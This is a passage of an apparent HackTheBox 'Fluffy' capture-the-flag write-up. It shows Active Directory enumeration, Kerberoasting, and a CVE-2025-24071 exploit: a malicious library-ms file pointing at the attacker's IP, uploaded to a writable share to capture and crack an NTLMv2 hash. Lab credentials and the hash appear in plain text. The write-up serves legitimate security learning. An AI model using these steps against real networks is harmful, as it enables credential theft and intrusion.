+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Nmap scan report for fluffy.htb (10.129.246.193)
+</span></span><span class="line"><span class="cl">Host is up (0.034s latency).
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT      STATE SERVICE       VERSION
+</span></span><span class="line"><span class="cl">53/tcp    open  domain        Simple DNS Plus
+</span></span><span class="line"><span class="cl">88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-05-25 02:15:06Z)
+</span></span><span class="line"><span class="cl">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+</span></span><span class="line"><span class="cl">389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
+</span></span><span class="line"><span class="cl">| ssl-cert: Subject: commonName=DC01.fluffy.htb
+</span></span><span class="line"><span class="cl">| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:DC01.fluffy.htb
+</span></span><span class="line"><span class="cl">| Not valid before: 2025-04-17T16:04:17
+</span></span><span class="line"><span class="cl">|_Not valid after:  2026-04-17T16:04:17
+</span></span><span class="line"><span class="cl">|_ssl-date: 2025-05-25T02:16:37+00:00; 0s from scanner time.
+</span></span><span class="line"><span class="cl">445/tcp   open  microsoft-ds?
+</span></span><span class="line"><span class="cl">464/tcp   open  kpasswd5?
+</span></span><span class="line"><span class="cl">593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+</span></span><span class="line"><span class="cl">636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
+</span></span><span class="line"><span class="cl">| ssl-cert: Subject: commonName=DC01.fluffy.htb
+</span></span><span class="line"><span class="cl">| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:DC01.fluffy.htb
+</span></span><span class="line"><span class="cl">| Not valid before: 2025-04-17T16:04:17
+</span></span><span class="line"><span class="cl">|_Not valid after:  2026-04-17T16:04:17
+</span></span><span class="line"><span class="cl">|_ssl-date: 2025-05-25T02:16:36+00:00; -1s from scanner time.
+</span></span><span class="line"><span class="cl">3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
+</span></span><span class="line"><span class="cl">|_ssl-date: 2025-05-25T02:16:37+00:00; 0s from scanner time.
+</span></span><span class="line"><span class="cl">| ssl-cert: Subject: commonName=DC01.fluffy.htb
+</span></span><span class="line"><span class="cl">| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:DC01.fluffy.htb
+</span></span><span class="line"><span class="cl">| Not valid before: 2025-04-17T16:04:17
+</span></span><span class="line"><span class="cl">|_Not valid after:  2026-04-17T16:04:17
+</span></span><span class="line"><span class="cl">3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
+</span></span><span class="line"><span class="cl">|_ssl-date: 2025-05-25T02:16:36+00:00; -1s from scanner time.
+</span></span><span class="line"><span class="cl">| ssl-cert: Subject: commonName=DC01.fluffy.htb
+</span></span><span class="line"><span class="cl">| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:DC01.fluffy.htb
+</span></span><span class="line"><span class="cl">| Not valid before: 2025-04-17T16:04:17
+</span></span><span class="line"><span class="cl">|_Not valid after:  2026-04-17T16:04:17
+</span></span><span class="line"><span class="cl">5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+</span></span><span class="line"><span class="cl">|_http-title: Not Found
+</span></span><span class="line"><span class="cl">|_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span class="line"><span class="cl">9389/tcp  open  mc-nmf        .NET Message Framing
+</span></span><span class="line"><span class="cl">49667/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49677/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+</span></span><span class="line"><span class="cl">49678/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49679/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49700/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49741/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Host script results:
+</span></span><span class="line"><span class="cl">| smb2-time: 
+</span></span><span class="line"><span class="cl">|   date: 2025-05-25T02:16:00
+</span></span><span class="line"><span class="cl">|_  start_date: N/A
+</span></span><span class="line"><span class="cl">| smb2-security-mode: 
+</span></span><span class="line"><span class="cl">|   3:1:1: 
+</span></span><span class="line"><span class="cl">|_    Message signing enabled and required
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl">Nmap done: 1 IP address (1 host up) scanned in 100.99 seconds
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Using the provided credentials, we can enumerate all Active Directory users with <code>netexec</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(kali㉿kali)-[~/Documents/fluffy]
+</span></span><span class="line"><span class="cl">└─$ nxc smb fluffy.htb -u users.txt -p pass.txt --users
+</span></span><span class="line"><span class="cl">SMB         10.129.246.193  445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False) 
+</span></span><span class="line"><span class="cl">SMB         10.129.246.193  445    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990! 
+</span></span><span class="line"><span class="cl">SMB         10.129.246.193  445    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-                                               
+</span></span><span class="line"><span class="cl">SMB         10.129.246.193  445    DC01             Administrator                 2025-04-17 15:45:01 0       Built-in account for administering the computer/domain 
+</span></span><span class="line"><span class="cl">SMB         10.129.246.193  445    DC01             Guest                         &lt;never&gt;             0       Built-in account for guest access to the computer/domain 
+</span></span><span class="line"><span class="cl">SMB         10.129.246.193  445    DC01             krbtgt                        2025-04-17 16:00:02 0       Key Distribution Center Service Account 
+</span></span><span class="line"><span class="cl">SMB         10.129.246.193  445    DC01             ca_svc                        2025-04-17 16:07:50 0        
+</span></span><span class="line"><span class="cl">SMB         10.129.246.193  445    DC01             ldap_svc                      2025-04-17 16:17:00 0        
+</span></span><span class="line"><span class="cl">SMB         10.129.246.193  445    DC01             p.agila                       2025-04-18 14:37:08 0        
+</span></span><span class="line"><span class="cl">SMB         10.129.246.193  445    DC01             winrm_svc                     2025-05-18 00:51:16 0        
+</span></span><span class="line"><span class="cl">SMB         10.129.246.193  445    DC01             j.coffey                      2025-04-19 12:09:55 0        
+</span></span><span class="line"><span class="cl">SMB         10.129.246.193  445    DC01             j.fleischman                  2025-05-16 14:46:55 0
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Complete list of users:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Administrator
+</span></span><span class="line"><span class="cl">Guest
+</span></span><span class="line"><span class="cl">krbtgt
+</span></span><span class="line"><span class="cl">ca_svc
+</span></span><span class="line"><span class="cl">ldap_svc
+</span></span><span class="line"><span class="cl">p.agila
+</span></span><span class="line"><span class="cl">winrm_svc
+</span></span><span class="line"><span class="cl">j.coffey
+</span></span><span class="line"><span class="cl">j.fleischman
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We can try to Kerberoast from netexec with the user account as well:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(kali㉿kali)-[~/Documents/fluffy]
+</span></span><span class="line"><span class="cl">└─$ nxc ldap fluffy.htb -u users.txt -p pass.txt --kerberoasting kerberoast.txt
+</span></span><span class="line"><span class="cl">LDAP        10.129.246.193     389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb)
+</span></span><span class="line"><span class="cl">LDAP        10.129.246.193     389    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990! 
+</span></span><span class="line"><span class="cl">LDAP        10.129.246.193     389    DC01             [*] Skipping disabled account: krbtgt
+</span></span><span class="line"><span class="cl">LDAP        10.129.246.193     389    DC01             [*] Total of records returned 3
+</span></span><span class="line"><span class="cl">LDAP        10.129.246.193     389    DC01             [*] sAMAccountName: ca_svc, memberOf: [&#39;CN=Service Accounts,CN=Users,DC=fluffy,DC=htb&#39;, &#39;CN=Cert Publishers,CN=Users,DC=fluffy,DC=htb&#39;],
+</span></span><span class="line"><span class="cl">&lt;...SNIP...&gt;                    
+</span></span><span class="line"><span class="cl">LDAP        10.129.246.193     389    DC01             [*] sAMAccountName: ldap_svc, memberOf: CN=Service Accounts,CN=Users,DC=fluffy,DC=htb,
+</span></span><span class="line"><span class="cl">&lt;...SNIP...&gt;                   
+</span></span><span class="line"><span class="cl">LDAP        10.129.246.193     389    DC01             [*] sAMAccountName: winrm_svc, memberOf: [&#39;CN=Service Accounts,CN=Users,DC=fluffy,DC=htb&#39;, &#39;CN=Remote Management Users,CN=Builtin,DC=fluffy,DC=htb&#39;],
+</span></span><span class="line"><span class="cl">&lt;...SNIP...&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We find three hashes, for ca_svc, ldap_svc, winrm_svc (all system accounts). Unsurprisingly, we cannot crack any passwords from these.</p>
+<p>When enumerating SMB shares we can find read/write on a share &ldquo;IT&rdquo;:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(kali㉿kali)-[~/Documents/fluffy]
+</span></span><span class="line"><span class="cl">└─$ nxc smb fluffy.htb -u users.txt -p pass.txt --shares
+</span></span><span class="line"><span class="cl">SMB         10.129.246.193  445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)
+</span></span><span class="line"><span class="cl">SMB         10.129.246.193  445    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990! 
+</span></span><span class="line"><span class="cl">SMB         10.129.246.193  445    DC01             [*] Enumerated shares
+</span></span><span class="line"><span class="cl">SMB         10.129.246.193  445    DC01             Share           Permissions     Remark
+</span></span><span class="line"><span class="cl">SMB         10.129.246.193  445    DC01             -----           -----------     ------
+</span></span><span class="line"><span class="cl">SMB         10.129.246.193  445    DC01             ADMIN$                          Remote Admin
+</span></span><span class="line"><span class="cl">SMB         10.129.246.193  445    DC01             C$                              Default share
+</span></span><span class="line"><span class="cl">SMB         10.129.246.193  445    DC01             IPC$            READ            Remote IPC
+</span></span><span class="line"><span class="cl">SMB         10.129.246.193  445    DC01             IT              READ,WRITE      
+</span></span><span class="line"><span class="cl">SMB         10.129.246.193  445    DC01             NETLOGON        READ            Logon server share 
+</span></span><span class="line"><span class="cl">SMB         10.129.246.193  445    DC01             SYSVOL          READ            Logon server share
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Inside we can find <a class="link" href="https://en.wikipedia.org/wiki/Everything_%28software%29"  target="_blank" rel="noopener"
+    >Everything</a>, Keepass and an Upgrade_Notice.pdf:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(kali㉿kali)-[~/Documents/fluffy]
+</span></span><span class="line"><span class="cl">└─$ smbclient \\\\fluffy.htb\\IT -U j.fleischman -W fluffy.htb
+</span></span><span class="line"><span class="cl">Password for [FLUFFY.HTB\j.fleischman]:
+</span></span><span class="line"><span class="cl">Try &#34;help&#34; to get a list of possible commands.
+</span></span><span class="line"><span class="cl">smb: \&gt; ls
+</span></span><span class="line"><span class="cl">  .                                   D        0  Sun May 25 02:23:46 2025
+</span></span><span class="line"><span class="cl">  ..                                  D        0  Sun May 25 02:23:46 2025
+</span></span><span class="line"><span class="cl">  Everything-1.4.1.1026.x64           D        0  Fri Apr 18 15:08:44 2025
+</span></span><span class="line"><span class="cl">  Everything-1.4.1.1026.x64.zip       A  1827464  Fri Apr 18 15:04:05 2025
+</span></span><span class="line"><span class="cl">  KeePass-2.58                        D        0  Fri Apr 18 15:08:38 2025
+</span></span><span class="line"><span class="cl">  KeePass-2.58.zip                    A  3225346  Fri Apr 18 15:03:17 2025
+</span></span><span class="line"><span class="cl">  Upgrade_Notice.pdf                  A   169963  Sat May 17 14:31:07 2025
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="leaked-vulnerability-notes-in-smb-share">Leaked vulnerability notes in SMB share
+</h3><p>When reading the pdf, we can find notes on vulnerabilities the administrators intend to patch:</p>
+<p><img src="/post/hackthebox-fluffy/Images/notice.png"
+	width="800"
+	height="583"
+	srcset="/post/hackthebox-fluffy/Images/notice_hu_160ae0373a391177.png 480w, /post/hackthebox-fluffy/Images/notice_hu_52c2eeca408153e3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="137"
+		data-flex-basis="329px"
+	
+></p>
+<p>Listed CVE&rsquo;s in the notice:</p>
+<p><a class="link" href="https://nvd.nist.gov/vuln/detail/CVE-2025-24996"  target="_blank" rel="noopener"
+    >CVE-2025-24996</a>
+<a class="link" href="https://nvd.nist.gov/vuln/detail/CVE-2025-24071"  target="_blank" rel="noopener"
+    >CVE-2025-24071</a>
+<a class="link" href="https://nvd.nist.gov/vuln/detail/CVE-2025-46785"  target="_blank" rel="noopener"
+    >CVE-2025-46785</a>
+<a class="link" href="https://nvd.nist.gov/vuln/detail/CVE-2025-29968"  target="_blank" rel="noopener"
+    >CVE-2025-29968</a>
+<a class="link" href="https://nvd.nist.gov/vuln/detail/CVE-2025-21193"  target="_blank" rel="noopener"
+    >CVE-2025-21193</a>
+<a class="link" href="https://nvd.nist.gov/vuln/detail/CVE-2025-3445"  target="_blank" rel="noopener"
+    >CVE-2025-3445</a></p>
+<h3 id="using-cve-2025-24071-to-steal-ntlm-hash">Using CVE-2025-24071 to steal NTLM hash
+</h3><p>For CVE-2025-24071, there are POC&rsquo;s on github such as this: <a class="link" href="https://github.com/Marcejr117/CVE-2025-24071_PoC"  target="_blank" rel="noopener"
+    >https://github.com/Marcejr117/CVE-2025-24071_PoC</a></p>
+<p>The PoC primarily operates by crafting a malicious library-ms. Since we have write permissions on the IT share, we can upload a payload to that location. I created the following malicious library-ms that will point to my own IP address, <code>10.10.14.28</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(kali㉿kali)-[~/Documents/fluffy]
+</span></span><span class="line"><span class="cl">└─$ cat exploit.library-ms 
+</span></span><span class="line"><span class="cl">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
+</span></span><span class="line"><span class="cl">&lt;libraryDescription xmlns=&#34;http://schemas.microsoft.com/windows/2009/library&#34;&gt;
+</span></span><span class="line"><span class="cl">  &lt;name&gt;Important Docs&lt;/name&gt;
+</span></span><span class="line"><span class="cl">  &lt;version&gt;6&lt;/version&gt;
+</span></span><span class="line"><span class="cl">  &lt;isLibraryPinned&gt;true&lt;/isLibraryPinned&gt;
+</span></span><span class="line"><span class="cl">  &lt;iconReference&gt;imageres.dll,-1003&lt;/iconReference&gt;
+</span></span><span class="line"><span class="cl">  &lt;templateInfo&gt;
+</span></span><span class="line"><span class="cl">    &lt;folderType&gt;Documents&lt;/folderType&gt;
+</span></span><span class="line"><span class="cl">  &lt;/templateInfo&gt;
+</span></span><span class="line"><span class="cl">  &lt;searchConnectorDescriptionList&gt;
+</span></span><span class="line"><span class="cl">    &lt;searchConnectorDescription&gt;
+</span></span><span class="line"><span class="cl">      &lt;isDefaultSaveLocation&gt;true&lt;/isDefaultSaveLocation&gt;
+</span></span><span class="line"><span class="cl">      &lt;isDefaultNonOwnerSaveLocation&gt;true&lt;/isDefaultNonOwnerSaveLocation&gt;
+</span></span><span class="line"><span class="cl">      &lt;simpleLocation&gt;
+</span></span><span class="line"><span class="cl">        &lt;url&gt;\\10.10.14.28\asdf3&lt;/url&gt;
+</span></span><span class="line"><span class="cl">      &lt;/simpleLocation&gt;
+</span></span><span class="line"><span class="cl">    &lt;/searchConnectorDescription&gt;
+</span></span><span class="line"><span class="cl">  &lt;/searchConnectorDescriptionList&gt;
+</span></span><span class="line"><span class="cl">&lt;/libraryDescription&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Before sending, we need to set up responder:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(kali㉿kali)-[~/Documents/fluffy]
+</span></span><span class="line"><span class="cl">└─$ sudo responder -I tun0
+</span></span><span class="line"><span class="cl">                                         __
+</span></span><span class="line"><span class="cl">  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+</span></span><span class="line"><span class="cl">  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
+</span></span><span class="line"><span class="cl">  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+</span></span><span class="line"><span class="cl">                   |__|
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">           NBT-NS, LLMNR &amp; MDNS Responder 3.1.5.0
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  To support this project:
+</span></span><span class="line"><span class="cl">  Github -&gt; https://github.com/sponsors/lgandx
+</span></span><span class="line"><span class="cl">  Paypal  -&gt; https://paypal.me/PythonResponder
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
+</span></span><span class="line"><span class="cl">  To kill this script hit CTRL-C
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[+] Poisoners:
+</span></span><span class="line"><span class="cl">    LLMNR                      [ON]
+</span></span><span class="line"><span class="cl">    NBT-NS                     [ON]
+</span></span><span class="line"><span class="cl">    MDNS                       [ON]
+</span></span><span class="line"><span class="cl">    DNS                        [ON]
+</span></span><span class="line"><span class="cl">    DHCP                       [OFF]
+</span></span><span class="line"><span class="cl">&lt;...SNIP...&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Now we can place the malicious library:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(kali㉿kali)-[~/Documents/fluffy]
+</span></span><span class="line"><span class="cl">└─$ smbclient \\\\fluffy.htb\\IT -U j.fleischman -W fluffy.htb
+</span></span><span class="line"><span class="cl">Password for [FLUFFY.HTB\j.fleischman]:
+</span></span><span class="line"><span class="cl">Try &#34;help&#34; to get a list of possible commands.
+</span></span><span class="line"><span class="cl">smb: \&gt; put exploit.library-ms 
+</span></span><span class="line"><span class="cl">putting file exploit.library-ms as \exploit.library-ms (7.0 kb/s) (average 7.0 kb/s)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Meanwhile on Responder:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[SMB] NTLMv2-SSP Client   : 10.129.246.193
+</span></span><span class="line"><span class="cl">[SMB] NTLMv2-SSP Username : FLUFFY\p.agila
+</span></span><span class="line"><span class="cl">[SMB] NTLMv2-SSP Hash     : p.agila::FLUFFY:951545949441f4a9:D35128666ECC8903371A2F0ADF181D0E:010100000000000080829D0B1B29DC0113829DDA8108310800000000020008004600410052005A0001001E00570049004E002D00350053004A005200450032004700310036004E00560004003400570049004E002D00350053004A005200450032004700310036004E0056002E004600410052005A002E004C004F00430041004C00030014004600410052005A002E004C004F00430041004C00050014004600410052005A002E004C004F00430041004C000700080080829D0B1B29DC01060004000200000008003000300000000000000001000000002000007F78754F0AA39AF5499DFC3DB8344A937DB65F4C8A69363BDC726C5BD895D4420A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00310038000000000000000000                                                                                          
+</span></span><span class="line"><span class="cl">[*] Skipping previously captured hash for FLUFFY\p.agila
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We can crack the hash with john the ripper:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(kali㉿kali)-[~/Documents/fluffy]
+</span></span><span class="line"><span class="cl">└─$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt 
+</span></span><span class="line"><span class="cl">Using default input encoding: UTF-8
+</span></span><span class="line"><span class="cl">Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
+</span></span><span class="line"><span class="cl">Will run 4 OpenMP threads
+</span></span><span class="line"><span class="cl">Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
+</span></span><span class="line"><span class="cl">prometheusx-303  (p.agila)     
+</span></span><span class="line"><span class="cl">1g 0:00:00:01 DONE (2025-05-27 04:12) 0.5263g/s 2377Kp/s 2377Kc/s 2377KC/s proquis..programmercomputer
+</span></span><span class="line"><span class="cl">Use the &#34;--show --format=netntlmv2&#34; options to display all of the cracked passwords reliably
+</span></span><span class="line"><span class="cl">Session completed.
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>p.agila:prometheusx-303</code></p>
+<h2 id="lateral-movement">Lateral Movement
+</h2><h3 id="leveraging-bloodhound-to-enumerate-potential-escalation-paths">Leveraging Bloodhound to enumerate potential escalation paths
+</h3><p>Using <code>bloodhound</code> we can do further enumeration of the Active Directory environment. This can be done right away with user j.fleischman. Deploying bloodhound enumeration through netexec:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(kali㉿kali)-[~/Documents/fluffy]
+</span></span><span class="line"><span class="cl">└─$ nxc ldap fluffy.htb -k -u j.fleischman -p &#39;J0elTHEM4n1990!&#39; --dns-server 10.129.246.193 --bloodhound -c All
+</span></span><span class="line"><span class="cl">LDAP        fluffy.htb      389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb)
+</span></span><span class="line"><span class="cl">LDAP        fluffy.htb      389    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990! 
+</span></span><span class="line"><span class="cl">LDAP        fluffy.htb      389    DC01             Resolved collection methods: dcom, objectprops, localadmin, psremote, container, rdp, session, trusts, acl, group                                                                   
+</span></span><span class="line"><span class="cl">LDAP        fluffy.htb      389    DC01             Using kerberos auth without ccache, getting TGT
+</span></span><span class="line"><span class="cl">LDAP        fluffy.htb      389    DC01             Done in 00M 06S
+</span></span><span class="line"><span class="cl">LDAP        fluffy.htb      389    DC01             Compressing output into /home/kali/.nxc/logs/DC01_fluffy.htb_2025-05-27_041615_bloodhound.zip
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>After importing our zip to bloodhound, we can find that our new user p.agila has GenericAll permissions over service accounts:</p>
+<p><img src="/post/hackthebox-fluffy/Images/agila_ga.png"
+	width="979"
+	height="339"
+	srcset="/post/hackthebox-fluffy/Images/agila_ga_hu_514d7010af60babd.png 480w, /post/hackthebox-fluffy/Images/agila_ga_hu_dbdcfd38bb5474bb.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="288"
+		data-flex-basis="693px"
+	
+></p>
+<p>This active directory group Service Accounts has GenericWrite over all the service accounts:</p>
+<p><img src="/post/hackthebox-fluffy/Images/sa_gw.png"
+	width="1018"
+	height="391"
